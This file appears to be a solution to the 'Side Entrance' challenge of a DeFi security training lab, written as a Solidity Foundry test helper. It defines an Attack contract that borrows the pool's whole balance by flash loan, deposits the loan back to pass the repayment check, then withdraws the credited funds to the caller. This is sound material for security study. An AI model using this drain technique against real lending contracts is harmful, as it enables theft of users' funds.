// Layout of Contract:
// version
// imports
// errors
// interfaces, libraries, contracts
// Type declarations
// State variables
// Events
// Modifiers
// Functions
// Layout of Functions:
// constructor
// receive function (if exists)
// fallback function (if exists)
// external
// public
// internal
// private
// internal & private view & pure functions
// external & public view & pure functions

// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.17;

// Imports
import {Utilities} from "../../utils/Utilities.sol";
import {Address} from "openzeppelin-contracts/utils/Address.sol";
import "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";
import {IFlashLoanEtherReceiver} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

import {SideEntrance} from "./SideEntrance.t.sol";
// contract

contract Attack is IFlashLoanEtherReceiver{
    SideEntranceLenderPool private immutable sideEntrance;
    using Address for address payable;
    constructor(address _sideEntrance){
        sideEntrance = SideEntranceLenderPool(_sideEntrance);
    }
    function execute() external payable{
        sideEntrance.deposit{value:msg.value}();
    }

    function attack() external{
        sideEntrance.flashLoan(address(sideEntrance).balance);
        sideEntrance.withdraw();
        payable(msg.sender).sendValue(address(this).balance);
    }
     receive() external payable {}
}